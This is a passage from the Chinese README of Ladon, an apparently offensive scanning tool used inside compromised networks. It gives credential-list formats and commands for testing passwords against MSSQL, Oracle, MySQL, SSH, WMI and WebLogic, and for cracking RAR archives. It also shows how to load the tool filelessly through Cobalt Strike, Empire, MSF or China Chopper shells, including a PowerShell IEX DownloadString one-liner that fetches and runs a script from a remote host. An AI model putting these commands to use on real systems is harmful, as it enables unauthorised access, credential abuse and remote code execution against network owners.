3  支持check.txt（存放IP/端口/库名/用户/密码）,不指定端口和数据库名则使用默认<br>
<br>
#### 数据库口令检测
数据库与其它密码爆破不同，有时数据库做了权限，指定用户只能连指定库，连默认库肯定不行<br>
##### mssql密码验证
(大型内网可能从其它机器收集到大量机器密码，第一步肯定是先验证)<br>
非默认端口请将以下端口改成被修改端口即可，单个IP可直接Ladon IP:端口 MssqlScan扫描<br>
check.txt<br>
192.168.1.8 1433 master sa k8gege<br>
192.168.1.8 sa k8gege<br>
192.168.1.8 1433 sa k8gege<br>
命令: Ladon MssqlScan<br>
##### oracle同理
192.168.1.8 1521 orcl system k8gege<br>
192.168.1.8 orcl system k8gege<br>
192.168.1.8 system k8gege<br>
命令: Ladon OracleScan<br>
##### mysql无需指定数据库名
192.168.1.8 3306 root k8gege<br>
192.168.1.8 root k8gege<br>
命令: Ladon MysqlScan<br>

##### 系统密码
SSH<br>
check.txt<br>
192.168.1.8 22 root k8gege<br>
192.168.1.8 root k8gege<br>
命令: Ladon SshScan<br>
SMB/IPC/WMI(直接ip/用户/密码)<br>
check.txt<br>
192.168.1.8 root k8gege<br>
命令: Ladon WmiScan<br>
##### 网站密码<br>
weblogic<br>
check.txt(url 用户 密码)<br>
http://192.168.1.8:7001/console weblogic k8gege<br>
命令: Ladon WeblogicScan<br>
<br>
##### 文件密码<br>
因Rar压缩包只需一个密码,故只需pass.txt,注意中文密码需将txt保存为Ansi编码<br>
命令: Ladon test.rar RarScan<br>
<br>
## PowerShell<br>
PowerLadon完美兼容win7-win10 PowerShell，对于不支持.net程序插件化的远控，可使用<br>
PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模块加载后用法和EXE一致。<br>
<br>
#### 0x001 PowerShell本地加载<br>
适用于支持PowerShell交互远控或Shell，如Cobalt Strike<br>
```Bash
> powershell <br>
> Import-Module .\Ladon.ps1<br>
> Ladon OnlinePC<br>
```

<img src=http://k8gege.org/k8img/Ladon/PowerLadon.gif></img><br>

#### 0x002 Cmd本地加载
适用于还没跟上时代的远控或Shell只支持CMD交互<br>
```bash
> powershell Import-Module .\Ladon.ps1;Ladon OnlinePC<br>
```
<img src=http://k8gege.org/k8img/Ladon/ps/CmdPSLadon.gif></img><br>
<br>
#### 0x003 Cmd远程加载
适用于还没跟上时代的远控或Shell只支持CMD交互<br>
```bash
> powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"<br>
```
<img src=http://k8gege.org/k8img/Ladon/ps/CmdPSRemoteLadon.gif></img><br>
<br>
#### 0x004 远控交互式CMD
<img src=http://k8gege.org/k8img/Ladon/ps/psladon_rat.PNG></img><br>
<br>
#### 0x005 菜刀非交互CMD
<img src=http://k8gege.org/k8img/Ladon/ps/psladon_cd.PNG></img><br>
<br>
#### 0x006 Empire非交互CMD
Empire的shell有点问题，分号被截断，可以加个cmd /c<br>
<img src=http://k8gege.org/k8img/Ladon/ps/psladon_empire.PNG></img><br>
<br>
#### 0x007 MSF交互式CMD
<br>
<br>
### 高级用法
Ladon最初的设计就是一款扫描框架，为了方便才内置功能<br>
毕竟需要使用一个功能就得在目标多上传一个文件是顶麻烦的<br>
不像MSF框架和模块多大都无所谓，因为你只是在本地使用<br>
为了让大家都可以自定义模块，Ladon插件支持多种编程语言<br>
最菜可通过INI配置插件，了解HTTP可通过EXP生成器生成POC<br>
懂得编程可使用C#、Delphi、VC编写DLL，PowerShell脚本<br>
<br>
#### 0x001 Exp生成器
EXP生成器教程: https://github.com/k8gege/Ladon/wiki/LadonExp-Usage<br>
实战例子: https://github.com/k8gege/Ladon/wiki/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-CVE-2018-2894<br>
<br>
#### 0x002 自定义模块教程
自定义模块教程: https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle<br>
<br>
#### 0x003 插件例子源码
https://github.com/k8gege/Ladon/raw/master/MoudleDemo.rar<br>
<br>
### 注本页面的教程并不是很全，详情请看WIKI,我会慢慢完善<br>
<br>
#### [Top](#readme)
